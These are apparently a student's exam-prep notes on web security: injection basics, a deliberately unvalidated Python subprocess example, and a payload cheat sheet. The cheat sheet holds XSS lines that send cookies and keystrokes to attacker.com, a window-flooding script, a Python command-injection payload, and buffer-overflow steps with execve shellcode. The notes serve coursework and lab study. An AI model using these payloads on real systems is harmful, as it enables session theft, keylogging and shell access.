Notes



### Web Application Types

We begin by segregating web applications majorly into 2 types : 
1. Static 
2. Dynamic

A static application is directly sent to the client side, without any changes being made by the server, in the process. 

Ex : Say, a portfolio website (as most people make on github), is the *same* for every user. It doesn't get changed per person, and is served as-it-is, to everyone. 

A dynamic web application changes - with these changes being made by the server - according to every single client. 

Ex : The "feed" on most social media websites are different for everyone. The layouts are similar, but the actual content differs. This is a Dynamic web application being served.


> It is evident, then, that most modern interfaces are actually dynamic. 

Dynamic applications *change* according to some metrics/factors - a factor could be the user value, for example. 

But what happens if an attacker can somehow manipulate these factors? 

They end up altering the served web content itself. Sometimes for other users, and even more severely, straight for the server.

### Changing Factors?... Huh

Now what exactly do we even mean by changing factors/values? 

Consider the following piece of code : 

```c 
if (unlock == 1){
	very_important_func(); //Assume this func exists... please? 
} else {
	perror("FAAAAAAAAAAAAAAH");
}
```

The "very important function" only runs if the variable unlock's value is set to 1. 

This should ideally happen only when the adequate permissions are available, yes? But what if, we *as the user/attacker* could manipulate the value of this `unlock` variable? 

What if we could *inject* a value of our choice?

## Injection!

Very aptly named, injection attacks are exactly as they sound : 

> The attacker injects a malicious value in a legitimate field, and changes the (web) application's behaviour.

I'll spare you the semantic jargon, however, the following resource from OWASP is recommended, should you prefer a formal definition : 

https://top10.owasp.org/2025/A05_2025-Injection/

Now, depending on what you are injecting (the payload) and where you inject it (the service targeted), Injection attacks can be categorized into multiple types. 

We'll be focusing on 2 kinds here (since those are the only ones relevant to the exam, and who wants to do more than necessary?) : 
1. SQL injection
2. Command Injection 

> Note: 
> I will add and expand more injection types later. We're sticking to the exam script right now, considering how little time is left. 


### SQL Injections 

SQL injections target ... well, SQL databases. Very cool. 

The philosophy behind SQL injection is 

How can make a legitimate functionality execute MY query? 

There's a few ways that can be done: 

1. Override a legitimate query with yours
2. Append your malicious query results to a legitimate one
3. Break a valid query by commenting out some of its logic

> Note: 
> Obviously, there are more ways, but the exams are only really relevant to these. 

### Command Injections

Sometimes applications run certain commands on the server-side, to fetch responses to user requests. 
While this is NOT recommended and is a bad idea through and through, it still happens. 

Command injection targets this oversight. 

As an example, consider that this is what happens in a webapp: 

```Python

import subprocess

user_req = input("Please input one of the following commands : \n 1.whoami \n 2.date \n 3.time \n Your command : ")

output_for_user = subprocess.run(user_req, capture_output=True, text=True, shell=True)

print(output_for_user.stdout)

```

While the Input dialogue instructs the user to only input 3 commands, there is no actual check or validation in place, and whatever the user enters, is blindly executed. 

This is a perfect opportunity for command injection, and a slightly curious attacker discover and exploit this easily. 

![[Pasted image 20261018190056.png|700]]
// What the user sees

![[Pasted image 20261018190141.png|700]]
//Running a valid command returns the output

However, what if we run a command of our liking? Say, if i wanted to list all contents of the folder?

![[Pasted image 20261018190441.png|700]]

This ends up listing the entire directory : 

![[Pasted image 20261018190516.png|700]]

Now this, is an issue, because now the attacker has access to all sorts of files. 

There's an interesting superSecretFile.txt 
Using the same program, we could try to get its contents : 

![[Pasted image 20261018190710.png|700]]

// It reveals a very important secret flag, that shouldn't really have been accessible using our program. 

> Now that we've seen how basic command injection works, what it is, and (hopefully) gained a rough understanding of it, I'll create a handy cheatsheet for payloads to use, steps to take, etc.

But, before that, I highly recommend that you try the labs yourself first: 

**Question 7 : Practical Lab 2 --> Command Injection**

# Payloads!!!

### Command Injection Payloads

###### Python Payloads: 

```python
__import__('os').popen('ls').read()
```

###### Php Payloads: 

```php
```


----

# Certain payloads and notes

### For OWASP ZAP

Scan in firefox headless mode with ajax crawlers. Sometimes, you will find Spider crawls though 

The whole point is an automated scanner, so there's not much to do really.

### Client side attacks

Use 

`<script> tags`

Reflected XSS  in comments: 

```
<script> function c() {while (true){window.open('www.google.com','_blank');}}window.onload = c;</script>
```

`<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>`

`<script>document.onkeypress = function(e) { new Image().src = "https://attacker.com/keylog.php?k=" + e.keyCode; }</script>`

`<script>document.forms[0].onsubmit = function() {document.forms[0].elements[0].value="hacked";}</script>`

https://www.hackerone.com/knowledge-center/how-xss-payloads-work-code-examples-and-how-prevent-them --> XSS payloads and mitigation


Cmd injection Server side: 


```
__import__('os').popen('ls').read()
```
### Buffer Overflow

Navigate to gdb and check initconfigs for intel 

![[Pasted image 20261019085817.png|700]]

list shows the source code

info functions for the functions

Some basic stepping commands: 

![[Pasted image 20261019090006.png|700]]

Compiling unsafe : 

`gcc -g -z execstack -no-pie -o sum sum.c`

Disabling va :

`sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space`
`sudo sysctl -w kernel.randomize_va_space=0`

Generating multiple input chars at will : 

`python2 -c 'print "A"*50'`


Break GDB after the unsafe function mem addr

While in gdb, do the python2 script

`run $(python2 -c 'print "A"*50')`

Examine the base pointer 

`x $rbp`


Examine n giant words after rsp :

`x/ngx $rsp`


Find the differences up to rbp :

`print (long)$rbp - (long) 0x7fffffffdee0` --> rbp btw

print number of difference chars


Split down the middle : 

The shell code will probably be provided. Find the length

when ready to run, force run with `\x90` no op

and the payload to fill looks like: 

```
run $(python2 -c 'print
"\x90"*59+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2
f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*38+
"\xa0\xde\xff\xff\xff\x7f"')
```

padding + shellcode + padding + return address 

![[Pasted image 20261019091350.png|700]]

![[Pasted image 20261019091411.png|700]]

Example Shell Codes: 

```
\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe
7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8\x3b\x11\x11\x11\x11\x11\x11\
x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05
```

More example shell code: 



# Buffer Overflow Checklist

While I recommend going through the practicals thoroughly, a few steps to keep in mind are noted below.

### Some Background info : 

There are certain parts to every program , which I assume you shall remember : 

1. Registers --> Small memory holders on the CPU itself. For us, the ones of note are `rbp`
 and `rsp`

2. gdb --> gnu debugger. This is what we use to examine, break and essentially mess with the program at hand.


